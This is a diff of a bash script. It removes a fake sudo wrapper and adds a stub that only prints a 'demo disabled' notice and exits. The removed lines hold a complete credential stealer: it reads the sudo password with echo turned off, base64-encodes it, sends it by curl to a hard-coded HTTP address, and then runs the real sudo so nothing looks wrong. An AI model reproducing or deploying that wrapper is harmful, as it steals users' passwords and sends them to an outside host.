@@ -1,23 +1,12 @@
-#!/bin/bash
-# ==============================================================================
-# DISCLAIMER & LEGAL NOTICE:
-# This script is provided STRICTLY for authorized red team testing, defense evasion
-# demonstration, and educational purposes in controlled lab environments.
-# Unauthorized credential harvesting or deployment on unauthorized systems is illegal.
-# ==============================================================================
-# shellcheck disable=SC2124
-ARGS="$@"
+#!/usr/bin/env bash
+set -euo pipefail
 
-leak_over_http() {
-    local encoded_password
-    encoded_password=$(echo "${1}" | base64 | sed 's/[=+/]//g')
-    curl -m 5 -s -o /dev/null "http://172.16.10.1:8080/${encoded_password}"
-}
+cat >&2 <<'NOTICE'
+This credential-exfiltration demo has been disabled.
 
-stty -echo
-read -r -p "[sudo] password for $(whoami): " sudopassw
-    
-leak_over_http "${sudopassw}"
-stty echo
-# shellcheck disable=SC2086
-echo "${sudopassw}" | /usr/bin/sudo -p "" -S -k ${ARGS}
+The previous version prompted for a sudo password and sent it to a hard-coded
+plain-HTTP endpoint. Never enter a real password into a security demonstration.
+Use a non-secret fixture in an isolated lab if you need to study credential
+handling, and send it only to a local mock receiver.
+NOTICE
+exit 1
